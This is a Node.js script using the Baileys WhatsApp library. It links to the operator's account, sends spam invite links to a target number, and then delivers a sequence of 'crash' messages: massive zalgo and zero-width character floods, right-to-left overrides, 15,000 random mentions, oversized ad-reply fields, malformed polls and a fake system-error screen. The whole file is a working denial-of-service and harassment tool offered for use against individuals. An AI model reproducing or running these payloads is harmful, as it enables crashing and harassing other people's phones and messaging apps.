const { makeWASocket, useMultiFileAuthState, DisconnectReason, fetchLatestBaileysVersion, makeCacheableSignalKeyStore, Browsers } = require('@whiskeysockets/baileys');
const pino = require('pino');
const readline = require('readline');

const TARGET = process.argv[2];
if (!TARGET) { console.log('Usage: node crimson.js 241XXXXXXXX'); process.exit(1); }
const TARGET_JID = TARGET.includes('@s.whatsapp.net') ? TARGET : TARGET + '@s.whatsapp.net';

const GROUP_INVITE = 'https://chat.whatsapp.com/CIQQN32Gu825CVzI5BIWMs';
const CHANNEL_LINK = 'https://whatsapp.com/channel/0029Vb7VJKA2P591KNZnBz1G';

const crashes = [
    'Z̷̴̵̶̷̸̢̡̨̡̢̧̨̛̛̗̘̙̜̝̞̟̠̤̥̦̩̪̫̬̭̮̯̰̱̲̳̹̺̻̼͇͈͉͍͎̽̾̿̀́͂̓̈́͆͊͋͌ͅ͏͓͔͕͖͙͚͐͑͒͗͛͘͜͟͢͝͞͠͡'.repeat(100),
    '\u200B'.repeat(5000) + '🩸 REGARDE TON ÉCRAN 🩸' + '\u200B'.repeat(5000),
    '\u202E' + 'S AV A G E X'.repeat(200) + '\u202E',
    { image: { url: 'https://i.imgur.com/placeholder.png' }, caption: '\u200B'.repeat(3000) + '💀 CRASH 💀' + '\u200B'.repeat(3000) },
    '\u200D'.repeat(3000) + '⛓️ TU NE PEUX RIEN FAIRE ⛓️' + '\u200D'.repeat(3000),
    '█'.repeat(10000),
    async (sock, target) => {
        const mentionedJids = Array.from({ length: 15000 }, () =>
            `1${Math.floor(Math.random() * 500000)}@s.whatsapp.net`
        );
        await sock.sendMessage(target, {
            text: '📤 Statut partagé',
            mentions: mentionedJids,
            contextInfo: {
                isForwarded: true,
                forwardingScore: 999,
                mentionedJid: mentionedJids
            }
        });
    },
    '\uD83D\uDE00\uFE0E\u200D\uD83D\uDE00\uFE0E'.repeat(500),
    '\u200D'.repeat(15000),
    async (sock, target) => {
        await sock.sendMessage(target, {
            text: '⚠️ Alerte Système',
            contextInfo: {
                forwardingScore: 999,
                isForwarded: true,
                externalAdReply: {
                    title: '⚠️'.repeat(5000),
                    body: '🚨'.repeat(10000),
                    thumbnailUrl: 'https://i.imgur.com/placeholder.png'
                }
            }
        });
    },
    async (sock, target) => {
        await sock.sendMessage(target, {
            poll: {
                name: '\u200B'.repeat(1000) + '💀 SONDAGE CRIMSON 💀' + '\u200B'.repeat(1000),
                options: [
                    'Z̷̴̵̶̷̸̢̡̨̡̢̧̨̛̛̗̘̙̜̝̞̟̠̤̥̦̩̪̫̬̭̮̯̰̱̲̳̹̺̻̼̽̾̿̀́͂̓̈́'.repeat(200),
                    '\u202E' + 'OPTION INVERSEE' + '\u202E',
                    '\u200B'.repeat(3000) + 'OPTION FANTÔME'
                ]
            }
        });
    },
    `🟦🟦🟦🟦🟦🟦🟦🟦🟦🟦🟦🟦🟦🟦🟦🟦🟦🟦🟦🟦
🟦                                                    🟦
🟦   Windows Error 0xDEADBEEF                         🟦
🟦   SYSTEM FAILURE - CONTACT ADMINISTRATOR            🟦
🟦                                                    🟦
🟦   ⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛⬛   97%
🟦                                                    🟦
🟦🟦🟦🟦🟦🟦🟦🟦🟦🟦🟦🟦🟦🟦🟦🟦🟦🟦🟦🟦`,
];

async function start() {
    const { state, saveCreds } = await useMultiFileAuthState('auth_info_crimson');
    const { version } = await fetchLatestBaileysVersion();
    const sock = makeWASocket({
        version,
        auth: { creds: state.creds, keys: makeCacheableSignalKeyStore(state.keys, pino({ level: 'silent' })) },
        logger: pino({ level: 'silent' }),
        browser: Browsers.ubuntu('Chrome'),
        connectTimeoutMs: 60_000
    });

    if (!sock.authState.creds.registered) {
        const rl = readline.createInterface({ input: process.stdin, output: process.stdout });
        const phone = await new Promise(resolve => rl.question('Ton numéro WhatsApp (ex: 241077335574) : ', answer => { rl.close(); resolve(answer.trim()); }));
        console.log('🔑 Génération du code d\'appairage...');
        try {
            const code = await sock.requestPairingCode(phone);
            console.log(`\n📲 CODE : ${code}`);
            console.log('👉 WhatsApp > Appareils liés > Lier avec un code, et saisis ce code.\n');
        } catch (err) { console.error('Erreur:', err.message); process.exit(1); }
    }

    sock.ev.on('connection.update', (update) => {
        const { connection } = update;
        if (connection === 'open') { console.log('✅ Connecté ! Envoi des crashes...'); sendCrashes(sock); }
        if (connection === 'close') { console.log('🔌 Déconnexion.'); process.exit(0); }
    });
    sock.ev.on('creds.update', saveCreds);
}

async function sendCrashes(sock) {
    console.log(`🔥 Crashes envoyés à ${TARGET_JID}`);
    try {
        await sock.sendMessage(TARGET_JID, { text: `🔗 Rejoins mon groupe : ${GROUP_INVITE}` });
        await sock.sendMessage(TARGET_JID, { text: `📢 Rejoins aussi ma chaîne WhatsApp : ${CHANNEL_LINK}` });
        console.log('   ✅ Liens envoyés');
    } catch (err) { console.log('   ❌ Erreur liens:', err.message); }

    for (let i = 0; i < crashes.length; i++) {
        const payload = crashes[i];
        try {
            if (typeof payload === 'function') {
                await payload(sock, TARGET_JID);
            } else if (typeof payload === 'string') {
                await sock.sendMessage(TARGET_JID, { text: payload });
            } else {
                await sock.sendMessage(TARGET_JID, payload);
            }
            console.log(`   ✅ Crash ${i+1}/${crashes.length} envoyé`);
        } catch (err) { console.log(`   ❌ Erreur crash ${i+1}:`, err.message); }
        await new Promise(resolve => setTimeout(resolve, 2000));
    }
    console.log('⚡ Attaque terminée. Déconnexion...');
    sock.end();
}
start();
